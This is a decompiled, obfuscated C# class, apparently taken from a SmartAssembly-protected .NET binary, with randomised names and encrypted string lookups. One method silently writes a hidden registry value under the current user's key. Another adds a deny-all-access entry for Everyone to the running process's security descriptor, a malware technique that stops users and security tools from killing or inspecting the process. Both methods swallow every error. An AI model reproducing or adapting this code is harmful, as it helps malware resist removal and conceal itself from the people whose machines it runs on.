using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace bmDbQpaZORfnY;

internal sealed class BsdcOFapuj
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr DugxnROkMsklxNxb, int YHyTgeSEHAn, [Out] byte[] SPYERXMQoK, uint hPvYFpVDshwTEQ, out uint EUSgtTGDEnvOk);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr lVSUogIToJgHKH, int SzGYnENJnA, [In] byte[] NPfJfZTRCAhz);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void RMqQvODFbPak(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(qMBmfvOoVnw.EGPIgSWIAKjM(getString_0(107404924)));
			registryKey.SetValue(qMBmfvOoVnw.EGPIgSWIAKjM(getString_0(107404851)), getString_0(107406488));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor ocVVFKwtyPk(IntPtr intptr_0)
	{
		byte[] sPYERXMQoK = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, sPYERXMQoK, 0u, out var EUSgtTGDEnvOk);
		if ((long)EUSgtTGDEnvOk > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, sPYERXMQoK = new byte[EUSgtTGDEnvOk], EUSgtTGDEnvOk, out EUSgtTGDEnvOk))
		{
			return null;
		}
		return new RawSecurityDescriptor(sPYERXMQoK, 0);
	}

	private void dtpYzhTqtD(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void gjpalJEBQQ()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = ocVVFKwtyPk(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			dtpYzhTqtD(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static BsdcOFapuj()
	{
		Strings.CreateGetStringDelegate(typeof(BsdcOFapuj));
	}
}
